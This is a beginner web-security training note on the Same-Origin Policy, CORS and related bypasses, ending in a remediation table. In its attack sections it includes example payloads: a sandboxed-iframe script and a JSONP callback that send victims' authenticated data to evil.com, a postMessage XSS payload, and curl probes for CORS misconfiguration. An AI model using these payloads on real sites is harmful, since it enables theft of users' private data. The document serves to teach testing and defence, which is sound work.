---
tags: [vapt, http, web, beginner]
difficulty: beginner
module: "02 - HTTP Deep Dive"
topic: "02.28 Same-Origin Policy (SOP)"
---

# 02.28 — Same-Origin Policy (SOP)

## What is it?

The **Same-Origin Policy (SOP)** is a browser security mechanism that prevents JavaScript on one origin from reading responses from a different origin. It's the foundation of web security — without it, any malicious website could read your email, bank balance, or steal your data from other sites.

**Origin = Scheme + Host + Port**

---

## What Makes Two URLs the "Same Origin"?

```
REFERENCE URL: https://target.com:443/page

URL                                   SAME ORIGIN?  WHY?
──────────────────────────────────────────────────────────────────────
https://target.com/other              YES  ← same scheme+host+port
https://target.com:443/data           YES  ← 443 is default for https
http://target.com/page                NO   ← different SCHEME (http vs https)
https://target.com:8080/page          NO   ← different PORT (443 vs 8080)
https://www.target.com/page           NO   ← different HOST (target.com vs www.target.com)
https://api.target.com/page           NO   ← different HOST (subdomain!)
https://evil.com/page                 NO   ← different HOST entirely
```

---

## What SOP Allows vs Blocks

```
ALLOWED CROSS-ORIGIN (despite different origin):
  <img src="https://other.com/image.jpg">    ← loading images OK
  <script src="https://cdn.com/lib.js">      ← loading scripts OK
  <link rel="stylesheet" href="...">         ← loading CSS OK
  <iframe src="https://other.com/">          ← EMBEDDING OK (can't read content!)
  <form action="https://other.com/submit">   ← POSTING to different origin OK (CSRF!)

BLOCKED CROSS-ORIGIN:
  fetch('https://other.com/api')             ← can't READ response
  xhr.open('GET', 'https://other.com/data')  ← can't READ response
  document.domain = 'target.com' (restricted)
  Reading iframe content from different origin ← BLOCKED
  Reading cookies from different origin ← BLOCKED

KEY INSIGHT:
  SOP blocks READING, not SENDING.
  You can POST to another origin (CSRF exploit this!).
  You can't READ the response without CORS permission.
```

---

## SOP Diagram

```
                   EVIL.COM page                    TARGET.COM
                       │                               │
                       │                               │
JavaScript on evil.com │                               │
makes request to:       │                               │
                        │  fetch('https://target.com/api/user/me')
                        │──────────────────────────────────────────→
                        │                               │
                        │  HTTP Response: {user: "alice", balance: $1000}
                        │←──────────────────────────────────────────
                        │                               │
        ┌───────────────▼──────────────────┐           │
        │ BROWSER BLOCKS: SOP violation!   │           │
        │ JavaScript cannot read response  │           │
        │ from target.com (different origin)│          │
        └──────────────────────────────────┘           │
                        │                               │
                 evil.com gets: TypeError: Failed to fetch
```

---

## How CORS Relaxes SOP

**CORS (Cross-Origin Resource Sharing)** is the official mechanism for servers to explicitly allow cross-origin access.

```
CORS "Simple Request" (no preflight):
  evil.com → fetch('https://target.com/api') → target.com
  
  If response has: Access-Control-Allow-Origin: https://evil.com
  OR:              Access-Control-Allow-Origin: *
  → Browser allows evil.com JS to READ the response!

CORS Preflight (for non-simple requests):
  evil.com → OPTIONS request → target.com
  Response: Access-Control-Allow-Origin: https://evil.com
            Access-Control-Allow-Methods: GET, POST
  → Browser sends actual request
  → evil.com can read response

Without CORS header:
  Request is SENT (SOP doesn't block sending)
  Response is RECEIVED by browser
  But browser blocks JavaScript from reading it!
```

---

## Security Context — SOP in VAPT

### 1. CORS Misconfiguration (SOP Bypass)

```
COMMON MISCONFIGURATIONS:

1. Wildcard origin:
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Credentials: true  ← INVALID! Can't combine!
   
   But:
   Access-Control-Allow-Origin: *
   (no credentials) → all public data is accessible cross-origin
   If this is a public endpoint with no auth, low risk.
   If sensitive data even without auth → HIGH RISK.

2. Reflect Origin header:
   Request: Origin: https://evil.com
   Response: Access-Control-Allow-Origin: https://evil.com  ← mirrors attacker!
   
   ATTACK:
   evil.com → fetch('https://target.com/api/me', {credentials:'include'})
   target.com responds with victim's data + ACAO: evil.com
   evil.com JS reads the response → GOT victim's data!

3. Null origin trust:
   Access-Control-Allow-Origin: null
   
   Null origin can be set by:
   <iframe sandbox> (sandboxed iframes send null origin)
   data: URIs
   file:// URLs (in some browsers)
   
   ATTACK:
   <iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://target.com/api',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.com/?d='+encodeURIComponent(d)))</script>">
```

### 2. SOP Bypass via document.domain

```
If two subdomains want to communicate:
  parent.js sets: document.domain = "target.com"
  iframe from sub.target.com also sets: document.domain = "target.com"
  → Now they're considered same origin!

ATTACK:
  If attacker controls any subdomain (XSS or subdomain takeover):
  subdomain sets document.domain = "target.com"
  Reads data from parent.target.com!
  
  ONLY possible if site sets document.domain (rare, deprecated in modern browsers).
```

### 3. JSONP — Legacy SOP Bypass

```
JSONP = JSON with Padding
Before CORS, used to bypass SOP via <script> tag.

VULNERABLE ENDPOINT:
  https://target.com/api/data?callback=evil_function
  
  Response: evil_function({"user":"alice","balance":1000})
  
  Since this is a <script>, browser loads and executes it!
  evil_function is defined by attacker → gets victim data!

ATTACK:
  <script>
  function evil_function(data) {
    fetch('https://evil.com/?d=' + JSON.stringify(data));
  }
  </script>
  <script src="https://target.com/api/data?callback=evil_function"></script>

MODERN STATUS: JSONP is outdated and dangerous. But legacy apps still use it.
TEST: Look for ?callback= parameter in API responses.
```

### 4. Postmessage — Cross-Origin Communication

```
window.postMessage() allows controlled cross-origin communication.

VULNERABLE CODE:
  window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;  ← XSS!
  });

  (No check on e.origin → any page can send messages!)

ATTACK from evil.com:
  var win = window.open('https://target.com');
  win.postMessage('<img src=x onerror=alert(1)>', '*');
  → XSS via postMessage!

TEST:
  Search for "addEventListener.*message" in JS files
  Check if origin is validated: if (e.origin !== "https://target.com") return;
```

---

## Hands-On: SOP/CORS Testing

```bash
# Test CORS configuration
curl -sI -X OPTIONS https://target.com/api \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" | grep -i "access-control"

# Does it mirror any origin?
curl -sI https://target.com/api/user \
  -H "Origin: https://evil.com" | grep -i "access-control-allow-origin"
# If "https://evil.com" → CORS misconfigured!

# Test null origin:
curl -sI https://target.com/api \
  -H "Origin: null" | grep -i access-control
# If "null" → exploitable via sandboxed iframe!

# Check with-credentials:
curl -sI https://target.com/api \
  -H "Origin: https://evil.com" | grep -i "access-control-allow-credentials"
# "true" + specific origin → session hijacking possible!

# Look for JSONP callbacks:
curl -s "https://target.com/api/data?callback=test" | head -5
# test({...}) → JSONP endpoint!
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| CORS reflects Origin header | Whitelist allowed origins explicitly |
| CORS with wildcard + credentials | Impossible to combine; use specific origin instead |
| Null origin trusted | Don't trust null origin for authenticated resources |
| JSONP endpoint exists | Replace with CORS, add CSRF protection |
| PostMessage no origin check | Always verify e.origin before processing messages |

---

## Related Notes
- [[Module 08 - CORS]] — full CORS misconfiguration attacks
- [[Module 07 - CSRF]] — SOP allows sending but not reading (CSRF abuses this)
- [[Module 02 - XSS]] — XSS bypasses SOP (same origin can do anything)
- [[Module 23 - WebSocket Security]] — WebSockets and SOP interaction
